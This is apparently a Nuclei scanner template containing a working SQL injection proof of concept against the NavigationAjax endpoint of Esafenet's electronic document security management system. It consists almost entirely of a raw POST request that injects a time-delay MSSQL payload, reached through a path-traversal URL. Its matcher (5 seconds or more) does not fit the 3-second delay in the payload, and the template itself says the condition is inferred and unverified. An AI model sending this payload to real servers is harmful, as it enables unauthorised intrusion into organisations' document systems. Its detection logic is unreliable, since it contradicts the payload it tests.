id: poc-3af44f0fd4a174f0a0b2
info:
  name: 亿赛通电子文档安全管理系统NavigationAjax存在SQL注入漏洞
  author: hacktwo
  severity: high
  description: '[!] 推断说明: 时间盲注: 命中条件为推断(duration>=5s), 请按实际 payload 延时核验。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
  tags: sqli,2025
http:
- raw:
  - 'POST /CDGServer3/js/../NavigationAjax HTTP/1.1

    Host: {{Hostname}}

    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36

    Connection: close

    Content-Length: 58

    Content-Type: application/x-www-form-urlencoded

    Accept-Encoding: gzip, deflate


    command=nav&id=-999''waitfor delay ''0:0:3''--+&name=&openId='
  redirects: false
  matchers:
  - type: dsl
    dsl:
    - status_code == 200 && duration >= 5
    condition: and
